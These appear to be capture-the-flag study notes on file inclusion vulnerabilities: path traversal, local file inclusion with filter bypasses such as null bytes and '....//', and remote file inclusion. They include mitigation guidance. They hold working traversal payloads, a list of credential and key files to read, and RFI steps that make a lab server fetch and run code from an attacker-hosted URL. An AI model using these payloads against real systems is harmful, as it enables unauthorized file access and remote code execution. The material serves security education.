### File Inclusion:

**What is File Inclusion?**  
File inclusion refers to vulnerabilities in web applications that allow an attacker to include files, typically through manipulated input parameters. These vulnerabilities can result in:  
- **Local File Inclusion (LFI):** Reading files already present on the server.  
- **Remote File Inclusion (RFI):** Including files from an external server.  
- **Directory Traversal:** Accessing unintended files by navigating directories.  

These issues arise when web applications retrieve and display files based on user input, such as images or documents. For example, consider the URL:  
```
http://webapp.thm/get.php?file=userCV.pdf
```
Here, the `file` parameter specifies which file to retrieve. If this input isn't properly validated, attackers can manipulate it to include unintended files.


### Why Do File Inclusion Vulnerabilities Happen?  
These vulnerabilities often stem from:  
1. **Poor Input Validation:** User input isn't sanitized or restricted, allowing attackers to pass malicious input.  
2. **Dynamic File Inclusion in Code:** Code written to dynamically include files (e.g., PHP's `include()` or `require()`) can be misused if improperly secured.  


### Risks of File Inclusion  
Exploiting file inclusion vulnerabilities can have severe consequences:  
- **Data Leakage:** Attackers can access sensitive files such as source code, credentials, or system configuration files.  
- **Remote Command Execution (RCE):** If attackers can upload files to the server, they might combine file inclusion with malicious scripts to execute commands remotely.  

For example, an attacker could retrieve system files like `/etc/passwd` (on Linux) or `C:\Windows\System32\config` (on Windows) to gather sensitive information.  

---
---


### Path Traversal:

#### **What is Path Traversal?**  
Path Traversal (or Directory Traversal) is a web vulnerability that allows attackers to access files and directories outside the intended root directory of a web application. This vulnerability occurs due to **poor input validation** and can lead to unauthorized access to sensitive files.


#### **How Does Path Traversal Work?**  
When web applications handle file requests dynamically (e.g., using functions like PHP's `file_get_contents()`), attackers can manipulate URL parameters to traverse directories. The typical payload involves using `../` to move up one directory at a time.

**Example Attack on Linux:**  
Target URL:  
```
http://webapp.thm/get.php?file=userCV.pdf
```

Malicious payload:  
```
http://webapp.thm/get.php?file=../../../../etc/passwd
```

Here:  
- `../../../../` moves up directories until reaching the root `/`.
- `/etc/passwd` is a sensitive file that contains user account information.

---

#### **Path Traversal on Windows**  
On Windows systems, attackers use Windows-style paths like:  
```
http://webapp.thm/get.php?file=../../../../boot.ini
```
or  
```
http://webapp.thm/get.php?file=../../../../windows/win.ini
```


#### **Key Files to Target During Testing**  
Below are common sensitive files across Linux and Windows systems:

| **Location**                  | **Description**                                                                 |
|-------------------------------|---------------------------------------------------------------------------------|
| `/etc/issue`                  | System identification message before the login prompt.                          |
| `/etc/profile`                | System-wide default variables and configurations.                              |
| `/proc/version`               | Version of the Linux kernel.                                                   |
| `/etc/passwd`                 | User account details.                                                          |
| `/etc/shadow`                 | Encrypted passwords (requires root privileges).                                |
| `/root/.bash_history`         | Command history for the root user.                                             |
| `/var/log/dmesg`              | System messages logged during startup.                                         |
| `/var/mail/root`              | Emails for the root user.                                                      |
| `/root/.ssh/id_rsa`           | Private SSH keys for the root user.                                            |
| `/var/log/apache2/access.log` | Logs of accessed requests for the Apache server.                               |
| `C:\boot.ini`                 | Boot options for systems with BIOS firmware.                                   |


#### **Mitigation and Prevention**  
1. **Input Validation:**  
   - Sanitize user inputs.
   - Only allow predefined, safe file paths.

2. **Restrict Access:**  
   - Use a secure base directory and limit file access within it.  
   - Disable unnecessary features like directory indexing.  

3. **Code Practices:**  
   - Avoid concatenating user input into file paths.
   - Implement allowlists for permitted file names or extensions.  

---
---


### Local File Inclusion (LFI)

#### **What is Local File Inclusion?**
Local File Inclusion (LFI) is a vulnerability that allows attackers to include files on a web server through user-supplied input. This vulnerability often occurs due to insecure use of PHP functions like `include`, `require`, `include_once`, and `require_once`. While PHP is commonly targeted, LFI vulnerabilities can also be found in other programming languages such as ASP, JSP, and Node.js.


#### **How Does LFI Work?**
Attackers exploit LFI vulnerabilities by injecting file paths into parameters passed to inclusion functions. This can allow them to:
1. Read sensitive files (e.g., `/etc/passwd`).
2. Execute malicious files if combined with other vulnerabilities like file upload.



### **Examples**

#### **Scenario 1: Basic LFI**
The following PHP code dynamically includes a file based on the `lang` parameter:

```php
<?php 
	include($_GET["lang"]);
?>
```

**How It Works:**  
- The parameter `lang` specifies the file to include.  
- Example:  
  ```
  http://webapp.thm/index.php?lang=EN.php
  ```
  Includes the `EN.php` file.

**Exploit:**  
If no input validation is implemented, an attacker can read sensitive files. For example:
```
http://webapp.thm/index.php?lang=/etc/passwd
```


#### **Scenario 2: Directory-Specific Inclusion**
The developer attempts to restrict file inclusion to a specific directory (`languages`) as follows:

```php
<?php 
	include("languages/" . $_GET['lang']);
?>
```

**How It Works:**  
- The `lang` parameter only includes files within the `languages/` directory.  
- Example:  
  ```
  http://webapp.thm/index.php?lang=EN.php
  ```
  Includes `languages/EN.php`.

**Exploit:**  
If the application doesn't validate input properly, an attacker can traverse directories and access files outside the `languages` directory:
```
http://webapp.thm/index.php?lang=../../../../etc/passwd
```


### **Steps to Exploit LFI**
1. **Analyze the parameter:** Identify the parameter being used for file inclusion (e.g., `lang`).
2. **Test payloads:** Inject common payloads such as `../` to traverse directories.
3. **Include sensitive files:** Use paths like `/etc/passwd` (Linux) or `C:\boot.ini` (Windows) to confirm the vulnerability.
4. **Locate the directory restriction:** If the inclusion function restricts the directory, use traversal payloads to escape it.


### **Practical Tasks**

#### **Task 1: Basic LFI**
Use the first code example and try to read the `/etc/passwd` file by manipulating the `lang` parameter:
```
http://webapp.thm/index.php?lang=/etc/passwd
```

#### **Task 2: Directory-Specific LFI**
Use the second code example, which specifies the `languages` directory. Try to determine the directory restriction and read the `/etc/passwd` file using traversal payloads:
```
http://webapp.thm/index.php?lang=../../../../etc/passwd
```

### **Key Takeaways**
1. LFI vulnerabilities are caused by **lack of input validation**.
2. Attacks often involve **path traversal** to access sensitive files.
3. Developers should:
   - Validate user input with allowlists.
   - Use secure coding practices, such as absolute paths or constants.
   - Avoid dynamic inclusion of files unless absolutely necessary.
  
---
---



### Local File Inclusion (LFI) - Advanced Techniques


### **1. Null Byte Injection (%00)**

#### Scenario: Developer appends `.php` to inputs

- When the web app includes files using this logic:
  ```php
  include("languages/" . $_GET['lang'] . ".php");
  ```
  The input automatically gets `.php` appended, making standard path traversal (e.g., `/etc/passwd`) ineffective.
  
- Example:
  ```
  http://webapp.thm/index.php?lang=../../../../etc/passwd
  ```
  Results in:
  ```
  include("languages/../../../../../etc/passwd.php");
  ```

#### **Bypass Technique: Null Byte Injection**
The null byte `%00` tells the web application to ignore everything after it in the string. 

- Payload:
  ```
  http://webapp.thm/index.php?lang=../../../../etc/passwd%00
  ```
- Interpreted as:
  ```
  include("languages/../../../../../etc/passwd");
  ```

#### **Limitations:**  
This technique only works in PHP versions below 5.3.4.


### **2. Filtering `/etc/passwd`**

#### Scenario: Developer filters sensitive keywords (e.g., `/etc/passwd`).

##### **Bypass 1: Null Byte Injection**
- Payload:
  ```
  http://webapp.thm/index.php?lang=/etc/passwd%00
  ```

##### **Bypass 2: Current Directory Trick**
Use `/../` or `/./` to confuse the filter:
- Payload:
  ```
  http://webapp.thm/index.php?lang=/etc/passwd/.
  ```

**How It Works:**  
- `/..` moves up one directory level.  
- `/.` stays in the current directory.  
- `/etc/passwd/.` resolves back to `/etc/passwd`.


### **3. Directory Traversal Filters**

#### Scenario: The developer filters `../`.

If you use a payload like:
```
http://webapp.thm/index.php?lang=../../../../etc/passwd
```
It results in:
```
include("languages/etc/passwd");
```

#### **Bypass Technique: Double Traversal**
Manipulate traversal by adding redundant characters to bypass the filter:
- Payload:
  ```
  http://webapp.thm/index.php?lang=....//....//....//etc/passwd
  ```
  
**Why It Works:**  
- The filter replaces only the first occurrence of `../`, leaving other traversal sequences intact.


### **4. Forced Directory Inclusion**

#### Scenario: The web application forces a specific directory in input.

Example:
```
http://webapp.thm/index.php?lang=languages/EN.php
```

If you try standard traversal:
```
http://webapp.thm/index.php?lang=../../../../../etc/passwd
```
It fails because the web app expects the directory `languages/` to exist.

#### **Bypass Technique: Include the required directory**
You need to incorporate `languages/` into your payload:
- Payload:
  ```
  http://webapp.thm/index.php?lang=languages/../../../../../etc/passwd
  ```


### **Key Lessons**
1. **Error messages are crucial**: Use error messages to understand how the application processes input.
2. **Bypass filters**: Use techniques like null byte injection, current directory (`/.`), or redundant traversal (`....//`).
3. **Dynamic paths**: Incorporate mandatory directories into your payload to satisfy the application's logic.

### **Tasks Recap**
1. **Lab #3**: Use `%00` to bypass `.php` suffix and read `/etc/passwd`.  
   - Example: `../../../../../etc/passwd%00`
   
2. **Lab #4**: Bypass filtering of `/etc/passwd` using `/../` or `/./`.  
   - Example: `/etc/passwd/.`

3. **Lab #5**: Bypass `../` filtering using redundant traversal.  
   - Example: `....//....//etc/passwd`

4. **Lab #6**: Exploit directory-specific logic by including the required directory in your payload.  
   - Example: `languages/../../../../../etc/passwd`


---
---


### Remote File Inclusion (RFI) 

#### **Definition**:
RFI is a technique that exploits vulnerable web applications by including external (remote) files through user input. If input is not sanitized properly, attackers can inject malicious URLs, resulting in server-side execution of the file's content.



### **Requirements for RFI**
1. **Improper Input Sanitization**: User input is not validated, allowing remote URLs.
2. **`allow_url_fopen` Enabled**: The PHP configuration must allow the inclusion of remote files via URLs.


### **Risks of RFI**
- **Remote Command Execution (RCE)**: The attacker can execute malicious code on the server.
- **Sensitive Information Disclosure**: Access to configuration files or sensitive server data.
- **Cross-Site Scripting (XSS)**: Inject malicious scripts into a web application.
- **Denial of Service (DoS)**: Overloading the server by including large files or malicious scripts.


### **Steps for an RFI Attack**

#### **1. Hosting a Malicious File**:
- The attacker hosts a file on their own server.  
  Example file `cmd.txt` hosted at `http://attacker.thm/cmd.txt`:
  ```php
  <?php echo "Hello THM"; ?>
  ```

#### **2. Injecting the Malicious URL**:
- The attacker uses a vulnerable entry point in the target application, such as:
  ```
  http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt
  ```

#### **3. Server Fetches the Malicious File**:
- The vulnerable application sends a `GET` request to the attacker's server to fetch `cmd.txt`.

#### **4. Server Executes the Malicious File**:
- The `include` function executes the content of `cmd.txt` on the target server:
  ```php
  include($_GET['lang']);
  ```

#### **5. Result**:
- The output of the malicious file (e.g., `Hello THM`) is displayed on the vulnerable web page or executed on the server.


### **RFI Lab**
**Lab URL**: [http://10.10.150.74/playground.php](http://10.10.150.74/playground.php)

#### **Steps to Perform RFI in the Lab**
1. **Host a Malicious File**:
   - Set up a simple web server to host your malicious file.  
   - Use Python to host a file (optional):
     ```bash
     echo '<?php echo "Hello THM"; ?>' > cmd.txt
     python3 -m http.server 80
     ```
   - The file will be accessible at `http://<YOUR-IP>/cmd.txt`.

2. **Inject the URL**:
   - Access the vulnerable application and inject your hosted file URL:
     ```
     http://10.10.150.74/playground.php?lang=http://<YOUR-IP>/cmd.txt
     ```

3. **Observe Execution**:
   - Check the web page for the output (e.g., "Hello THM").
   - Confirm that the file is executed on the server.



### **Mitigation for RFI**
1. **Disable `allow_url_fopen`**:
   - Turn off remote file inclusion in PHP settings.
     ```ini
     allow_url_fopen = Off
     ```

2. **Input Validation**:
   - Sanitize user inputs to allow only expected values.

3. **Use Whitelisting**:
   - Restrict input to a predefined set of allowed files or directories.

4. **Least Privilege**:
   - Limit server permissions to prevent execution of unauthorized code.

5. **Web Application Firewall (WAF)**:
   - Use WAFs to filter malicious inputs at the network level.


### **Key Takeaways**
- RFI is a critical vulnerability that can lead to RCE.
- Understanding input sanitization and server-side behavior is crucial in exploiting and mitigating RFI.
- Always ensure secure PHP configurations and sanitize all user inputs.

---
---


### **Prevention of File Inclusion Vulnerabilities**

### **1. Regular Updates**
- **Why**: Vulnerabilities often arise due to outdated software.
- **What to Do**: 
  - Keep your **operating system**, **web server**, **frameworks**, and **libraries** up to date.
  - Apply security patches promptly.


### **2. Disable Error Reporting in Production**
- **Why**: Error messages can leak sensitive information (e.g., file paths).
- **What to Do**:
  - Configure PHP to suppress errors:
    ```ini
    display_errors = Off
    log_errors = On
    ```
  - Store error logs securely for debugging purposes.


### **3. Use a Web Application Firewall (WAF)**
- **Why**: WAFs can detect and block common file inclusion payloads.
- **What to Do**:
  - Deploy a reliable WAF, such as **Cloudflare**, **ModSecurity**, or **AWS WAF**.
  - Customize WAF rules to block file inclusion attempts.


### **4. Disable Risky PHP Features**
- **Why**: Features like `allow_url_fopen` and `allow_url_include` enable remote file inclusion.
- **What to Do**:
  - Disable these features in the PHP configuration file (`php.ini`):
    ```ini
    allow_url_fopen = Off
    allow_url_include = Off
    ```


### **5. Restrict Allowed Protocols and Wrappers**
- **Why**: Unnecessary PHP wrappers (e.g., `php://`, `ftp://`) increase attack surfaces.
- **What to Do**:
  - Analyze your application's requirements and disable unused wrappers and protocols.
  - Use strict configuration to limit file access.


### **6. Input Validation**
- **Why**: User input is the primary vector for file inclusion attacks.
- **What to Do**:
  - **Sanitize Inputs**: Remove unwanted characters like `../`, `%00`, etc.
  - **Validate Inputs**: Ensure inputs match expected patterns or values.
    ```php
    $lang = $_GET['lang'];
    if (!in_array($lang, ['EN', 'FR', 'ES'])) {
        die('Invalid input');
    }
    ```


### **7. Use Whitelisting and Blacklisting**
- **Why**: Restricting file access reduces the risk of including malicious files.
- **What to Do**:
  - **Whitelist**: Specify allowed file names and directories.
    ```php
    $allowed_files = ['languages/EN.php', 'languages/FR.php'];
    if (!in_array($file, $allowed_files)) {
        die('Access denied');
    }
    ```
  - **Blacklist**: Block risky characters or patterns (e.g., `../`, `://`).


### **8. Principle of Least Privilege**
- **Why**: Reducing server permissions limits the impact of an exploit.
- **What to Do**:
  - Ensure that the web server runs with limited privileges.
  - Restrict file read/write access to only necessary files and directories.


### **9. Secure Coding Practices**
- **Why**: Properly written code reduces the risk of vulnerabilities.
- **What to Do**:
  - Avoid dynamically including files based on user input.
  - If dynamic inclusion is necessary, rigorously validate input.
